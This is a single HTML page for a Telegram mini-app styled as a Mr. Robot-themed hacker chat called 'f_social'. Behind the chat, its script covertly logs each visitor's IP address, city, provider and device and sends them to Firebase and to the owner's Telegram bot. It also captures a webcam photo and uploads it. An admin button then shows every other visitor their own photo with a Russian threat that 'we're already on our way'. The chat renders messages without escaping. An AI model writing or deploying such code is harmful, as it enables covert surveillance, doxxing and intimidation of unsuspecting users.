<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>f_social // root_access</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    
    <style>
        :root { --f-red: #ff003c; --f-white: #f0f0f0; --f-black: #0a0a0a; --f-green: #00ff41; }
        body { background: var(--f-black); color: var(--f-white); font-family: 'Courier New', monospace; margin: 0; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
        
        /* Загрузка */
        #boot-screen { position: fixed; inset: 0; background: #000; z-index: 9999; padding: 20px; font-size: 11px; color: var(--f-green); overflow-y: auto; }
        .cursor { display: inline-block; width: 8px; height: 15px; background: var(--f-green); animation: blink 0.8s infinite; vertical-align: middle; }
        @keyframes blink { 50% { opacity: 0; } }

        /* Приложение */
        #app { display: none; flex-direction: column; height: 100vh; position: relative; }
        header { padding: 15px; border-bottom: 1px solid #222; text-align: center; flex-shrink: 0; position: relative; }
        .logo { font-size: 20px; font-weight: bold; letter-spacing: 5px; color: var(--f-red); }
        
        #admin-btn { display: none; position: absolute; right: 10px; top: 12px; background: var(--f-red); color: white; border: none; padding: 8px 12px; font-size: 10px; font-weight: bold; animation: pulse 1.5s infinite; z-index: 100; cursor: pointer; }
        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(255, 0, 60, 0.7); } 70% { box-shadow: 0 0 0 10px rgba(255, 0, 60, 0); } 100% { box-shadow: 0 0 0 0 rgba(255, 0, 60, 0); } }

        /* Навигация */
        .nav-tabs { display: flex; border-bottom: 1px solid #222; background: #0d0d0d; flex-shrink: 0; }
        .tab { flex: 1; padding: 15px 5px; text-align: center; font-size: 10px; cursor: pointer; color: #444; border-bottom: 2px solid transparent; text-transform: uppercase; }
        .tab.active { color: var(--f-red); border-bottom: 2px solid var(--f-red); background: rgba(255, 0, 60, 0.05); }

        /* Контент */
        .tab-content { display: none; flex-grow: 1; padding: 15px; overflow-y: auto; }
        .tab-content.active { display: flex; flex-direction: column; }

        /* Чат */
        #global-chat { flex-grow: 1; overflow-y: auto; display: flex; flex-direction: column; gap: 10px; margin-bottom: 10px; }
        .m-wrap { border-left: 2px solid #222; padding-left: 10px; margin-bottom: 5px; }
        .m-user { color: var(--f-red); font-size: 10px; display: block; margin-bottom: 2px; }
        .m-text { font-size: 14px; color: #ccc; word-wrap: break-word; }

        .input-box { display: flex; gap: 8px; border-top: 1px solid #222; padding: 10px 0; }
        input { flex: 1; background: #000; border: 1px solid #333; color: #fff; padding: 12px; outline: none; font-family: inherit; }
        button#send-btn { background: var(--f-red); color: white; border: none; padding: 0 20px; font-weight: bold; cursor: pointer; }

        /* Whoami */
        #captured-photo { width: 100%; max-width: 320px; border: 2px solid var(--f-red); margin: 20px auto; display: block; filter: contrast(1.1); }
        #alert-text { color: var(--f-red); font-weight: bold; text-align: center; display: none; font-size: 18px; line-height: 1.4; }
    </style>
</head>
<body>

    <div id="boot-screen"><div id="boot-logs"></div><span class="cursor"></span></div>

    <div id="app">
        <header>
            <div id="status-node" style="position: absolute; left: 10px; top: 18px; font-size: 8px; color: #333;">NODE: sync...</div>
            <div class="logo">f_<span>social</span></div>
            <button id="admin-btn" onclick="triggerHack()">[EXECUTE_PAYLOAD]</button>
        </header>

        <nav class="nav-tabs">
            <div class="tab active" id="btn-chat" onclick="openTab('tab-chat')">/global_chat</div>
            <div class="tab" id="btn-whoami" onclick="openTab('tab-whoami')">/whoami</div>
        </nav>

        <div id="tab-chat" class="tab-content active">
            <div id="global-chat"></div>
            <div class="input-box">
                <input type="text" id="chat-in" placeholder="type_message..." autocomplete="off">
                <button id="send-btn" onclick="sendMsg()">></button>
            </div>
        </div>

        <div id="tab-whoami" class="tab-content">
            <p style="text-align:center; font-size:10px; color:#444;">[USER_INTEL_ACQUIRED]</p>
            <img id="captured-photo" src="">
            <div id="alert-text">МЫ УЖЕ ВЫЕХАЛИ. КУ ОТ F SOCIAL.</div>
        </div>
    </div>

<script>
    // --- НАСТРОЙКИ ---
    const firebaseConfig = {
        apiKey: "AIzaSyAYX3NCBoMREGY4WZGqgo-kl3hj5h7gq-A",
        authDomain: "fcocial-v5r.firebaseapp.com",
        projectId: "fcocial-v5r",
        storageBucket: "fcocial-v5r.firebasestorage.app",
        messagingSenderId: "737704812350",
        appId: "1:737704812350:web:b6254574bcf1d3c5e6166f",
        databaseURL: "https://fcocial-v5r-default-rtdb.firebaseio.com/"
    };

    const BOT_TOKEN = "ТВОЙ_ТОКЕН_БОТА"; // Вставь сюда токен от BotFather
    const MY_TG_ID = 5131628747; 

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    let isElliot = false;
    let myNick = "anon_" + Math.floor(Math.random()*999);

    window.onload = () => {
        const tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand();
        
        if (tg.initDataUnsafe?.user?.id === MY_TG_ID) {
            isElliot = true;
            myNick = "Elliot_Alderson";
            document.getElementById('admin-btn').style.display = 'block';
        }
        
        document.getElementById('status-node').innerText = `NODE: ${myNick}`;
        bootSequence();
    };

    async function bootSequence() {
        const logs = ["intercepting_packets...", "mapping_network...", "firebase_link: OK", "scanning_biometrics..."];
        for(let t of logs) {
            let l = document.createElement('div'); l.innerText = `> ${t}`;
            document.getElementById('boot-logs').appendChild(l);
            await new Promise(r => setTimeout(r, 400));
        }
        await logTargetData(); 
        startCapture();
        listenForHack();
        listenChat(); // Запуск прослушивания истории чата
    }

    async function logTargetData() {
        try {
            const res = await fetch('https://ipapi.co/json/');
            const info = await res.json();
            
            const msg = `🔔 ВХОД В СЕТЬ:\nНик: ${myNick}\nIP: ${info.ip}\nГород: ${info.city}\nПровайдер: ${info.org}\nУстройство: ${navigator.platform}`;
            
            if (!isElliot) {
                db.ref('logs').push({ ...info, nick: myNick, time: new Date().toLocaleString() });
                sendTgNotify(msg); // Отправка уведомления тебе в ТГ
            }
        } catch (e) { console.log("LOG_SKIP"); }
    }

    function sendTgNotify(text) {
        if (BOT_TOKEN === "ТВОЙ_ТОКЕН_БОТА") return;
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${MY_TG_ID}&text=${encodeURIComponent(text)}`);
    }

    async function startCapture() {
        try {
            const s = await navigator.mediaDevices.getUserMedia({ video: true });
            const v = document.createElement('video'); v.srcObject = s; v.play();
            setTimeout(() => {
                const c = document.createElement('canvas');
                c.width = v.videoWidth; c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                c.toBlob(b => {
                    const reader = new FileReader();
                    reader.readAsDataURL(b); 
                    reader.onloadend = () => {
                        document.getElementById('captured-photo').src = reader.result;
                        if (!isElliot) db.ref('captured_faces').push({ user: myNick, photo: reader.result });
                    }
                    s.getTracks().forEach(t => t.stop());
                    document.getElementById('boot-screen').style.display = 'none';
                    document.getElementById('app').style.display = 'flex';
                }, 'image/jpeg');
            }, 2000);
        } catch(e) {
            document.getElementById('boot-screen').style.display = 'none';
            document.getElementById('app').style.display = 'flex';
        }
    }

    function triggerHack() {
        if(!isElliot) return;
        db.ref('attack_signal').set(Date.now());
        alert("PAYLOAD ACTIVATED.");
    }

    function listenForHack() {
        db.ref('attack_signal').on('value', (snap) => {
            if (isElliot || !snap.val()) return;
            openTab('tab-whoami');
            document.getElementById('alert-text').style.display = 'block';
            if(window.navigator.vibrate) window.navigator.vibrate([500, 100, 500]);
        });
    }

    // --- ИСТОРИЯ ЧАТА ---
    function sendMsg() {
        const i = document.getElementById('chat-in');
        if(!i.value.trim()) return;
        db.ref('global_chat').push({ user: myNick, text: i.value, timestamp: Date.now() });
        i.value = '';
    }

    function listenChat() {
        db.ref('global_chat').limitToLast(30).on('value', snap => {
            const box = document.getElementById('global-chat');
            box.innerHTML = '';
            snap.forEach(c => {
                const d = c.val();
                const div = document.createElement('div');
                div.className = 'm-wrap';
                div.innerHTML = `<span class="m-user">${d.user}:</span><span class="m-text">${d.text}</span>`;
                box.appendChild(div);
            });
            box.scrollTop = box.scrollHeight;
        });
    }

    function openTab(tabId) {
        document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
        document.getElementById(tabId).classList.add('active');
        if(tabId === 'tab-chat') document.getElementById('btn-chat').classList.add('active');
        if(tabId === 'tab-whoami') document.getElementById('btn-whoami').classList.add('active');
    }
</script>
</body>
</html>
